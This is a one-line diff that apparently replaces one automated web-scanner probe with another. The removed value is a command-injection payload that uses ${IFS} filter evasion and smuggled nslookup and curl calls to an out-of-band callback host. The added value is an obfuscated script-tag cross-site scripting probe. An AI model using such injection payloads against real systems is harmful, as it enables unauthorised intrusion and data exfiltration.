@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitsfpvyqtqcw03fa5.bxss.me||curl${IFS}hitsfpvyqtqcw03fa5.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitsfpvyqtqcw03fa5.bxss.me||curl${IFS}hitsfpvyqtqcw03fa5.bxss.me)&`'
+'"()&%<zzz><ScRiPt >amJ8(9896)</ScRiPt>
